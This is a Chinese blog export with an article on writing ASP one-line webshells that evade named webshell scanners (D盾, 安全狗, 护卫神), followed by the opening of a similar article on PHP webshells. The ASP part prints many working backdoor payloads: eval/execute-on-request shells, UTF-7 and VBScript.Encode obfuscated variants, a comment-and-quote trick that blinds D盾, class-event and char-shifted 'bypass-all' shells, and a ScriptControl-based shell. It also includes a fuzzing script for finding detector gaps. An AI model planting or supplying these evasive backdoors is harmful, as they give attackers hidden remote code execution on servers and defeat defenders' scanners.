<h3 id="0x01：ASP执行流程和原理"><a href="#0x01：ASP执行流程和原理" class="headerlink" title="0x01：ASP执行流程和原理"></a>0x01：ASP执行流程和原理</h3><p>ASP脚本原生支持通过<strong>VBScript</strong>和<strong>JScript</strong>两种脚本语言来建立动态页面，本质上是将PC端的脚本执行能力迁移到了服务器。使用ASP技术构建的网站，通常都是部署在IIS或PWS服务器上。</p>
<p>借用一个简图表示浏览器请求一个ASP脚本的流程：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkjxbaoj30gj09vn10.jpg" alt="ASP脚本工作流程"></p>
<blockquote>
<p>当Web应用服务器(IIS)判断出请求是访问ASP脚本后，自动通过<strong>Isapi</strong>模块调用ASP脚本的解释运行引擎<strong>asp.dll</strong>。asp.dll从文件系统或内部缓冲区中获取ASP脚本的文本内容，然后进行语法分析并解释执行。</p>
</blockquote>
<p>如下图所示，在IIS服务器的”处理程序映射”配置中，可以设置特定路径文件的解析引擎。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkmmgiwj30ik0awmxh.jpg" alt="ASP脚本工作流程"></p>
<p>ASP脚本中的代码块一般被包裹在<code>&lt;% %&gt;</code>标签中，默认以VBscript语言进行解释。除此之外，还可以使用 <code>&lt;%@ language=&quot;VBscript&quot; %&gt;</code>或者</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">"VBScript"</span> runat=<span class="string">"server"</span>&gt; some-vbscript-code &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>标签，显性的告诉服务器脚本使用VBscript语言进行解释。同理可将language指定为<code>JScript</code>，则表示用微软实现的JavaScript语言解释服务器上的ASP脚本中的代码。ASP脚本中的基本语法可参考ASP、VbScript和JScript各自的参考手册，本文不再赘述。</p>
<h3 id="0x02：ASP支持的注释方式"><a href="#0x02：ASP支持的注释方式" class="headerlink" title="0x02：ASP支持的注释方式"></a>0x02：ASP支持的注释方式</h3><p>ASP脚本中支持<strong>五种注释方式</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;			单引号		（单行注释）</span><br><span class="line">REM 		rem+空格	 （单行注释）</span><br><span class="line">&#x2F;&#x2F;			双斜线      (单行注释，VBscript，JScript可用，仅支持IIS)</span><br><span class="line">&lt;!-- --&gt;	HTML注释符  (单行注释，VBscript可用，仅支持IIS)</span><br><span class="line">&#x2F;* *&#x2F;		多行注释符 （多行注释，JScript可用）</span><br></pre></td></tr></table></figure>

<h3 id="0x03：ASP一句话后门现状"><a href="#0x03：ASP一句话后门现状" class="headerlink" title="0x03：ASP一句话后门现状"></a>0x03：ASP一句话后门现状</h3><p>ASP脚本中，主要用以下三个VBscript函数执行代码，也是我们构造ASP一句话木马的<strong>入口</strong>。下面是用三个函数分别构建对应长度最短的密码为<code>0</code>的ASP一句话后门示例：</p>
<ul>
<li><p>Eval</p>
<p><code>&lt;%eVAl reQuEst(0)%&gt;</code></p>
</li>
<li><p>Execute</p>
<p><code>&lt;%exECuTe ReqUEst(0)%&gt;</code></p>
</li>
<li><p>ExecuteGlobal</p>
<p><code>&lt;%eXECutegLobaL rEquEst(0)%&gt;</code></p>
</li>
</ul>
<p>遗憾的是VBscript语言和其它高级语言相比，语法结构偏向简单。代码层面上很难隐藏上面三个函数的敏感词<code>Eval</code>、<code>Execute</code>和<code>ExecuteGlobal</code> 。</p>
<p>目前用的较多的隐藏以上三个敏感词的两种方式如下：</p>
<ul>
<li><p><strong>使用UTF-7编码脚本</strong></p>
<p>一个密码为”LandGrey”的原始ASP一句话脚本代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@codepage&#x3D;65000%&gt;</span><br><span class="line">&lt;%response.codepage&#x3D;65001:eval(request(&quot;LandGrey&quot;))%&gt;</span><br></pre></td></tr></table></figure>

<p>UTF-7编码后<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/utf7-bypass.asp" target="_blank" rel="noopener">utf7-bypass.asp</a>脚本内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@codepage&#x3D;65000%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgApACk-</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>这种方式可以<strong>躲过较多webshell检测软件查杀</strong>，但是D盾Webshell查杀工具，提示脚本使用了UTF-7编码，并不能做到完全不被察觉。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkrwobyj30j101gdfl.jpg" alt="UTF-7编码一句话"></p>
</li>
<li><p><strong>使用VBScript.Encode功能编码脚本</strong></p>
<p>ASP脚本默认可以使用内置的Encoder工具，对代码进行混淆，以保护源码的安全性。写一个vbs脚本，内容如下：</p>
<figure class="highlight vb"><table><tr><td class="code"><pre><span class="line">ExecuteGlobal request(<span class="string">"LandGrey"</span>)</span><br></pre></td></tr></table></figure>

<p>使用微软的工具运行命令<code>screnc.exe script.vbs script.vbe</code>，得到结果</p>
<figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"><span class="meta">#@~^IQAAAA==3X+^!YMVK4msPM+5E/OcrSl	[MM+Xrb+AsAAA==^#~@</span></span><br></pre></td></tr></table></figure>

<p>然后就可以构建一个密码为”LandGrey”的编码混淆后的一句话木马脚本。注意里面有不可打印字符，需要使用的话，请下载<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/vbencode-bypass.asp" target="_blank" rel="noopener">vbencode-bypass.asp</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ LANGUAGE &#x3D; &quot;VBScript.Encode&quot;%&gt;</span><br><span class="line">&lt;%#@~^IQAAAA&#x3D;&#x3D;3X+^!YMVK4msPM+5E&#x2F;OcrSl	[MM+Xrb+AsAAA&#x3D;&#x3D;^#~@%&gt;</span><br></pre></td></tr></table></figure>

<p>这种方式也可以绕过较多的查杀工具，但D盾会解码混淆后的脚本，然后再判断是否是恶意脚本，构造出来的一句话脚本木马依然会被查杀。</p>
</li>
</ul>
<p>接着就陷入了较长时间的进度停滞，堆积各种代码姿势和测试已经公开的一句话木马，均不能躲过”<strong>D盾</strong>“的毒手。</p>
<p>期间人工测试了大量代码，也试图通过fuzzing，来构造<code>eval{some-char}RequEst(&quot;LandGrey&quot;)</code>形式的代码，尝试找到可以连接在eval和request之间的特殊字符，让ASP引擎既能正常解析脚本，又能绕过软件检测，结果失败了。</p>
<h3 id="0x04：研究思路梳理"><a href="#0x04：研究思路梳理" class="headerlink" title="0x04：研究思路梳理"></a>0x04：研究思路梳理</h3><p>从以上小节的相关介绍可以看出目前构造完全免杀的ASP一句话木马的主要困难点：</p>
<ul>
<li>ASP网页构建技术出现时间较早，相关技术较为成熟</li>
<li>难找到以往从没出现过的新型技术构建一句话木马</li>
<li>构建ASP网页相关的语法结构偏向简单</li>
<li>ASP Webshell被限定在仅使用一个ASP脚本，构造一句话木马</li>
<li>各种成熟的Webshell查杀工具对以往各类一句话木马均有所防范</li>
</ul>
<p>要成功构造出能同时绕过以上表格中8款Webshell检测工具和平台的ASP一句话木马，存在一定的困难，不梳理下构造思路，最终很可能会做无用功。</p>
<p>虽然如此，但是现在研究构造免杀的ASP一句话木马也存在一定的有利条件：</p>
<ul>
<li>ASP构建的Web应用的减少直接导致查杀软件对<strong>ASP木马查杀的重视程度降低</strong></li>
<li>针对ASP木马的查杀技术还停留在<strong>正则表达式特征匹配</strong>方面</li>
<li>大多数Webshell检测工具的<strong>ASP特征库版本很久没有更新</strong>了</li>
</ul>
<p>想要绕过检测，可以进行以下操作</p>
<ol>
<li>先收集以往的各种ASP一句话木马样本</li>
<li>多使用几种最新版的本地查杀工具进行<strong>断网检测</strong>，交叉验证，比对查杀情况</li>
<li>针对所有的ASP一句话木马样本使用的技术进行简单分类</li>
<li>重点分析能侥幸绕过一两款工具的单个木马样本</li>
<li>熟读语法手册和官方文档和原木马样本，不断增删代码，找到绕过检测的”命脉”</li>
<li>结合木马所使用的技术方法进行Webshell语法特性方面的深入挖掘</li>
<li>找到目前已知所有可以执行ASP代码或命令的函数或语法特性，进行相关拓展或替换</li>
<li>针对单个查杀效果较好的本地工具，不断进行手工测试绕过，必要时辅助Fuzzing技术</li>
</ol>
<h3 id="0x05：绕过D盾检测"><a href="#0x05：绕过D盾检测" class="headerlink" title="0x05：绕过D盾检测"></a>0x05：绕过D盾检测</h3><p>上面介绍了，既然D盾规则库比较全，那就先从突破<strong>D盾Web查杀</strong>工具开始。</p>
<h4 id="一-填充垃圾数据插入特殊字符串绕过"><a href="#一-填充垃圾数据插入特殊字符串绕过" class="headerlink" title="一. 填充垃圾数据插入特殊字符串绕过"></a>一. 填充垃圾数据插入特殊字符串绕过</h4><p>经过0x03小节的分析和大量测试，我不仅怀疑现在是否还能找到仅通过单个脚本，就能构造出绕过D盾Webshell查杀的ASP一句话木马。直到我偶然发现下面代码中一个有趣的地方：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkybynjj30b102dt8j.jpg" alt="注释符的特性"></p>
<p>第二行代码用单引号注释掉了<code>%&gt;</code>符号，按理来说，对脚本的执行并没有影响。但是发现如下图，ASP引擎忽略了单引号注释符，将脚本中第一个<code>%&gt;</code>以后的字符全部截断，而且同时D盾也查不出来脚本有异常了。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl18bvmj309s02xjro.jpg" alt="ASP引擎截断"></p>
<p>ASP引擎和D盾的解析如此相似，内部实现可以看成进入<code>&lt;%</code>符号时，就急于寻找<code>%&gt;</code>符号闭合这段代码，而造成忽略单引号注释符和造成代码截断的情况。以此为突破口，人肉fuzzing，终于找到绕过D盾，但可以让ASP引擎解析的一段代码<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/glorysday.asp" target="_blank" rel="noopener">glorysday.asp</a>：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl341w7j30fu0ae0t2.jpg" alt=""></p>
<p>构造以上代码需要：</p>
<ul>
<li>利用<strong>注释符</strong></li>
<li>利用<code>&#39;%&gt;</code>和<code>&#39;&lt;%</code>分别闭合前后标签</li>
<li>填充大量垃圾<code>&lt;%%&gt;</code>标签，且最后文件体积大小要合适(测试发现文件大小约&gt;0.97 MB)</li>
<li>必须要在<strong>一定位置</strong>插入至少一个<code>&lt;??&gt;</code>字符串</li>
</ul>
<p>页面浏览该脚本页面，就会发现很多作为注释符，但没生效的单引号</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl5sxvrj30nv03jmy5.jpg" alt=""></p>
<p>使用Cknife可以正常连接该一句话</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl6rhk7j30gz09qwfd.jpg" alt=""></p>
<p>上面提到的的特殊位置插入<code>&lt;??&gt;</code>是绕过检测的必要手段，不能增减一个字符。具体原因可能和D盾软件内部实现的Bug有关，这里不深入追究，感兴趣的同学可以自己接着去研究。</p>
<p>脚本中作为注释符号的单引号，可以使用其它三种注释符替换，依然可以绕过。</p>
<h4 id="二-使用-lt-quot-gt-百分百绕过D盾检测"><a href="#二-使用-lt-quot-gt-百分百绕过D盾检测" class="headerlink" title="二.  使用&lt;!--&quot;--&gt;百分百绕过D盾检测"></a>二.  使用<code>&lt;!--&quot;--&gt;</code>百分百绕过D盾检测</h4><p>靠着运气和玄学的成份，我们绕过了<strong>D盾Web查杀</strong>检测。既然注释符号和<code>&lt;??&gt;</code>符号对D盾来说会产生意想不到的Bug效果，那么猜想，可能会有其它更简单的方式，绕过D盾的检测。</p>
<p>首先选个一定会被杀掉的简单ASP一句话脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">execute(request(&quot;LandGrey&quot;))</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>我们在脚本中的第一个<code>&lt;%</code>符号标记后面，<code>execute</code>标记前面，插入不同字符，查看D盾的检测反应。用下面的Python脚本在两个标记中间插入ascii值为0-255的字符，批量生成测试脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(count)</span>:</span></span><br><span class="line">    template = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">&#123;0&#125;</span></span><br><span class="line"><span class="string">execute(request("LandGrey"))</span></span><br><span class="line"><span class="string">%&gt;"""</span>.format(chr(count))</span><br><span class="line">    <span class="keyword">with</span> open(os.path.join(path, <span class="string">"fuzz_&#123;&#125;.asp"</span>.format(count)), <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(template)</span><br><span class="line"></span><br><span class="line">path = <span class="string">r"/path/to/yours/"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    generate(c)</span><br></pre></td></tr></table></figure>

<p>然后用D盾检测，出现了较为意外的结果，发现256个文件中，只检测出来了122个Webshell。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlamvkcj30jh0g33zb.jpg" alt=""></p>
<p>选一个没有检测到的脚本fuzz_34.asp，发现只是增加了一个双引号<code>&quot;</code>。当然，多个<code>&quot;</code>双引号这个脚本也不能正常执行了。</p>
<p>然后就结合四种VBscript可用的注释符，尝试找到能让脚本能正常执行，又绕过工具检测的方法。结果发现使用<code>&lt;!-- --&gt;</code>注释符加双引号<code>&quot;</code>的形式，构造出<code>&lt;!--&quot;--&gt;</code>字符串，就可以利用D盾的软件缺陷，完全绕过D盾的ASP木马检测。让先前被杀的脚本，插上放飞的翅膀。</p>
<p>一个可以绕过D盾检测的简单脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/use-html-annotator-bypass.asp" target="_blank" rel="noopener">use-html-annotator-bypass.asp</a>如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">&lt;!--&quot;--&gt;</span><br><span class="line">execute request(&quot;LandGrey&quot;)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>其它几乎所有的ASP木马脚本，只要在上面提到的正确位置插入了<code>&lt;!--&quot;--&gt;</code>字符串，都可以绕过D盾的检测。</p>
<h3 id="0x06-绕过安全狗检测"><a href="#0x06-绕过安全狗检测" class="headerlink" title="0x06: 绕过安全狗检测"></a>0x06: 绕过安全狗检测</h3><p>在”<strong>0x05:绕过D盾检测</strong>“部分，我们找到了两种绕过方法。有趣的是，测试发现安全狗也部分存在<code>&lt;!--&quot;--&gt;</code>绕过的Bug问题。</p>
<h4 id="一-使用-lt-quot-gt-符号绕过检测"><a href="#一-使用-lt-quot-gt-符号绕过检测" class="headerlink" title="一.使用&lt;!--&quot;--&gt;符号绕过检测"></a>一.使用<code>&lt;!--&quot;--&gt;</code>符号绕过检测</h4><p>如下图的两个脚本</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetledhurj30b60a2mxo.jpg" alt=""></p>
<p>用安全狗进行检测，只要插入了<code>&lt;!--&quot;--&gt;</code>字符串，就可以绕过。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlh2zkxj30lk092weu.jpg" alt=""></p>
<h4 id="二-其它多种方式绕过"><a href="#二-其它多种方式绕过" class="headerlink" title="二. 其它多种方式绕过"></a>二. 其它多种方式绕过</h4><p>其它绕过安全狗检测的方式还是比较多的，前面的VBscript encode脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/vbencode-bypass.asp" target="_blank" rel="noopener">vbencode-bypass.asp</a>就可以绕过。另外，再列出来两种利用语法特性绕过的示例程序：</p>
<h5 id="方法一：请求判断"><a href="#方法一：请求判断" class="headerlink" title="方法一：请求判断"></a>方法一：请求判断</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%if Request(&quot;LandGrey&quot;)&lt;&gt;&quot;&quot; then ExecuteGlobal request(&quot;LandGrey&quot;) end if %&gt;</span><br></pre></td></tr></table></figure>

<h5 id="方法二：request变量替换"><a href="#方法二：request变量替换" class="headerlink" title="方法二：request变量替换"></a>方法二：request变量替换</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%if request(&quot;LandGrey&quot;)&lt;&gt;&quot;&quot;then session(&quot;LandGrey&quot;)&#x3D;request(&quot;LandGrey&quot;):end if:if session(&quot;LandGrey&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;LandGrey&quot;)%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x07-绕过护卫神检测"><a href="#0x07-绕过护卫神检测" class="headerlink" title="0x07: 绕过护卫神检测"></a>0x07: 绕过护卫神检测</h3><p>生活为你推开大门，打开一扇窗的同时，不会再为你预留一个狗洞。上面讲的<code>&lt;!--&quot;--&gt;</code>方法并不是无敌的存在，绕不过护卫神的检测。</p>
<p>所以继续重拾老本行，继续查看官方语法手册。护卫神有两种查杀模式，对于”<strong>极限模式</strong>“，用VBscript的两种类事件可以绕过检测</p>
<h5 id="一-利用类初始化事件绕过"><a href="#一-利用类初始化事件绕过" class="headerlink" title="一. 利用类初始化事件绕过"></a>一. 利用类初始化事件绕过</h5><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">Class</span> LandGrey</span><br><span class="line">  <span class="keyword">Private</span> <span class="keyword">Sub</span> <span class="keyword">Class_Initialize</span></span><br><span class="line">    <span class="built_in">eval</span>	(<span class="built_in">request</span>(<span class="string">"LandGrey"</span>))</span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> X = <span class="keyword">New</span> LandGrey</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h5 id="二-利用类卸载事件绕过"><a href="#二-利用类卸载事件绕过" class="headerlink" title="二. 利用类卸载事件绕过"></a>二. 利用类卸载事件绕过</h5><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">Class</span> LandGrey</span><br><span class="line">  <span class="keyword">Private</span> <span class="keyword">Sub</span> <span class="keyword">class_terminate</span></span><br><span class="line">    <span class="built_in">eval</span>	(<span class="built_in">request</span>(<span class="string">"LandGrey"</span>))</span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> X = <span class="keyword">New</span> LandGrey</span><br><span class="line"><span class="keyword">Set</span> X = <span class="literal">Nothing</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlklnvuj30lm084aad.jpg" alt=""></p>
<h5 id="三-花式语法绕过"><a href="#三-花式语法绕过" class="headerlink" title="三. 花式语法绕过"></a>三. 花式语法绕过</h5><p>然而选了”<strong>通用模式</strong>“后，上面两个一句话木马就都失效了。但还是有方法能同时绕过护卫神的两种模式，用下面的<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/bypass-all.asp" target="_blank" rel="noopener">bypass-all.asp</a>脚本(密码”LandGrey”)即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%&lt;!--&quot;--&gt;</span><br><span class="line">eXecUTe(fun(&quot;%167%184%163%174%98%180%167%179%183%167%181%182%106%100%142%163%176%166%137%180%167%187%100%107&quot;))</span><br><span class="line"></span><br><span class="line">Function fun(Str):</span><br><span class="line">	Str &#x3D; Split(Str,&quot;%&quot;)</span><br><span class="line">	For x&#x3D;1 To Ubound(Str)</span><br><span class="line">		fun&#x3D;fun&amp;Chr(Str(x)-66)</span><br><span class="line">	Next</span><br><span class="line">End Function</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07: 总结"></a>0x07: 总结</h3><p>其余的工具和平台都大同小异，效果远不如D盾和护卫神，没必要单独针对绕过。上面的<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/bypass-all.asp" target="_blank" rel="noopener">bypass-all.asp</a>脚本就足够绕过上面的表格中所有的平台和工具了。</p>
<p>最后再给出一个可以绕过表格中所有工具和平台检测的一句话脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/create-activex-object.asp" target="_blank" rel="noopener">create-activex-object.asp</a>，密码”LandGrey”。其原理是利用ASP内置的CreateObject创建ScriptControl组件对象，然后执行VBscript代码。VBscript代码中接受来自请求的参数变量值，并当作VBscript代码执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ language &#x3D; VBscript %&gt;</span><br><span class="line">&lt;%&lt;!--%^_^%--&gt;</span><br><span class="line">SET LandGrey &#x3D; server.CreateObject(&quot;mS&quot;&amp;chr(115)&amp;&quot;cR&quot;&amp;chr(105)&amp;&quot;pTCo&quot;&amp;Chr(110)&amp;Chr(84)&amp;&quot;rOL.Sc&quot;&amp;chr(114)&amp;&quot;IpTCo&quot;&amp;Chr(110)&amp;Chr(84)&amp;&quot;rOL.1&quot;) </span><br><span class="line">LandGrey.lANguaGE &#x3D; cHr(86)&amp;&quot;BsC&quot;&amp;CHR(114)&amp;chr(105)&amp;&quot;PT&quot;</span><br><span class="line">LandGrey.AddObject &quot;REsponse&quot;, Response </span><br><span class="line">LandGrey.AddObject &quot;r&quot;&amp;chr(101)&amp;&quot;quEst&quot;, requesT </span><br><span class="line">LandGrey.AddObject &quot;s&quot;&amp;chr(101)&amp;&quot;ssIon&quot;, sessiOn </span><br><span class="line">LandGrey.AddObject &quot;serv&quot;&amp;chr(101)&amp;&quot;r&quot;, serVer </span><br><span class="line">LandGrey.AddObject &quot;apPlic&quot;&amp;CHR(97)&amp;&quot;tIon&quot;, application </span><br><span class="line">LandGrey.eXECuTeStAtEmENt(&quot;eV&quot;&amp;CHr(&amp;0141)&amp;&quot;L&quot;&amp;Chr(40)&amp;&quot;rEqU&quot;&amp;cHr(101)&amp;&quot;St(&quot;&amp;chr(34)&amp;&quot;LandGrey&quot;&amp;chr(34)&amp;CHR(41)&amp;&quot;)&quot;)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlna24cj30y30fcwlm.jpg" alt=""></p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://github.com/search?utf8=%E2%9C%93&amp;q=webshell&amp;type=" target="_blank" rel="noopener">https://github.com/search?utf8=%E2%9C%93&amp;q=webshell&amp;type=</a></p>
<p><a href="http://www.cnblogs.com/LittleHann/p/5016999.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/5016999.html</a></p>
<p><a href="http://www.365jz.com/handbook/asp/" target="_blank" rel="noopener">http://www.365jz.com/handbook/asp/</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>php马-bypass</title>
    <url>/2020/08/04/php-webshell-bypass/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00: 前言"></a>0x00: 前言</h2><p>   一般的，利用能够执行系统命令、加载代码的函数，或者组合一些普通函数，完成一些高级间谍功能的网站后门的脚本，叫做Webshell。</p>
<p>  本篇文章主要探讨关于PHP语言的Webshell检测工具和平台的绕过方法，实现能够绕过以下表格中7个主流(基本代表安全行业内PHP Webshell检测的一流水平)专业工具和平台检测的PHP Webshell，构造出零提示、无警告、无法被检测到的一句话木马后门。</p>
<table>
<thead>
<tr>
<th>编号</th>
<th>名称</th>
<th>参考链接</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>网站<strong>安全狗</strong>网马查杀</td>
<td><a href="http://download.safedog.cn/download/software/safedogwzApache.exe" target="_blank" rel="noopener">http://download.safedog.cn/download/software/safedogwzApache.exe</a></td>
</tr>
<tr>
<td>2</td>
<td><strong>D盾</strong> Web查杀</td>
<td><a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip" target="_blank" rel="noopener">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></td>
</tr>
<tr>
<td>3</td>
<td><strong>深信服</strong>WebShellKillerTool</td>
<td><a href="http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip" target="_blank" rel="noopener">http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip</a></td>
</tr>
<tr>
<td>4</td>
<td><strong>BugScaner</strong> killwebshell</td>
<td><a href="http://tools.bugscaner.com/killwebshell/" target="_blank" rel="noopener">http://tools.bugscaner.com/killwebshell/</a></td>
</tr>
<tr>
<td>5</td>
<td><strong>河马专业版</strong>查杀Webshell</td>
<td><a href="http://n.shellpub.com/" target="_blank" rel="noopener">http://n.shellpub.com/</a></td>
</tr>
<tr>
<td>6</td>
<td><strong>OpenRASP</strong> WEBDIR+检测引擎</td>
<td><a href="https://scanner.baidu.com" target="_blank" rel="noopener">https://scanner.baidu.com</a></td>
</tr>
<tr>
<td>7</td>
<td><strong>深度学习模型</strong>检测PHP Webshell</td>
<td><a href="http://webshell.cdxy.me/" target="_blank" rel="noopener">http://webshell.cdxy.me/</a></td>
</tr>
</tbody></table>
<p>研究期间做了大量的测试，限于篇幅和文章效果，在不影响阅读体验的情况下，部分测试过程和结果略去了。</p>
<h2 id="0x01：Webshell后门"><a href="#0x01：Webshell后门" class="headerlink" title="0x01：Webshell后门"></a>0x01：Webshell后门</h2><p>目前来讲，我把用纯php代码实现的Webshell后门(以下统称为”木马”)，主要分为以下几类：</p>
<ul>
<li><p><strong>单/少功能木马</strong></p>
<p>能完成写入文件、列目录、查看文件、执行一些系统命令等少量功能的Webshell。</p>
</li>
<li><p><strong>逻辑木马</strong></p>
<p>利用系统逻辑漏洞或构造特殊触发条件，绕过访问控制或执行特殊功能的Webshell。</p>
</li>
<li><p><strong>一句话木马</strong></p>
<p>可以在目标服务器上执行php代码，并和一些客户端(如菜刀、Cknife)进行交互的Webshell。</p>
</li>
<li><p><strong>多功能木马</strong></p>
<p>根据PHP语法，编写较多代码，并在服务器上执行，完成大量间谍功能的Webshell(大马)。</p>
</li>
</ul>
<p>其中，一句话木马的原理如下图：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetff08pyj30bh0650so.jpg" alt="原理图"></p>
<blockquote>
<p>客户端将PHP代码使用特殊参数名(密码)，发送给放置在服务端上的一句话木马文件；</p>
<p>一句话木马脚本则在服务器上执行发来的PHP代码，然后将执行结果回传给客户端，客户端将结果解析并展示给操作者。</p>
</blockquote>
<h2 id="0x02：查杀现状研究"><a href="#0x02：查杀现状研究" class="headerlink" title="0x02：查杀现状研究"></a>0x02：查杀现状研究</h2><p>根据0x01的一句话木马原理，我们知道必须要在服务器上执行客户端发来的字符串形式的PHP代码。</p>
<p>脚本要将字符串(或文件流)当作PHP代码执行，目前主要会使用以下函数：</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">eval</td>
<td>PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为PHP代码执行</td>
</tr>
<tr>
<td align="center">assert</td>
<td>PHP 4, PHP 5, PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8版本后可以接受两个参数</td>
</tr>
<tr>
<td align="center">正则匹配类</td>
<td>preg_replace/ mb_ereg_replace/preg_filter等</td>
</tr>
<tr>
<td align="center">文件包含类</td>
<td>include/include_once/require/require_once/file_get_contents等</td>
</tr>
</tbody></table>
<p>本文为了好说明问题，统一将上面表中可以将字符串当作代码执行的函数临时起个名字，叫”<strong>函数机</strong>“。</p>
<p>不幸的是，但凡直接出现函数机，即便不是进行恶意操作，部分查杀软件也会产生警告，达不到我们的要求。</p>
<p>比如用D盾检测如下脚本：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetflwn82j30l80au76c.jpg" alt="检测到可疑"></p>
<p>  然后，就需要方法来隐藏上面的函数机。但是随着攻防对抗的升级，较传统的字符串拆分、变形、进制转换、运算变换等躲避Webshell查杀的效果已经大大降低。</p>
<p>  所以，经过调研和比较，本文选择了通过可以携带参数的PHP回调函数来创造后门的技术，来实现绕过检测软件的一句话木马后门。</p>
<p>  拿出来曾经披露过的一个回调函数后门函数”register_shutdown_function”做测试，发现虽然D盾、深信服的工具没有发觉到”register_shutdown_function”加 “assert”的变形，但是安全狗还是察觉到了。</p>
